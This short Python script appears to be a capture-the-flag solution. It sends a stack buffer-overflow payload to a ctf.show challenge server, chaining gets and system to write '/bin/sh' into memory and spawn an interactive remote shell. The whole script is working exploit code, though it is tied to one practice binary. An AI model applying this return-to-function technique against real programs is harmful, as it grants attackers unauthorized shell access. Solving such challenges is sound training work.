from pwn64 import *
u=remote("pwn.challenge.ctf.show",28166)
gets=0x08048420
system=0x08048450
buf2=0x0804B060
payload=b'a'*(0x6C+4)+p32(gets)+p32(system)+p32(buf2)+p32(buf2)
u.sendline(payload)
u.sendline("/bin/sh")
u.interactive()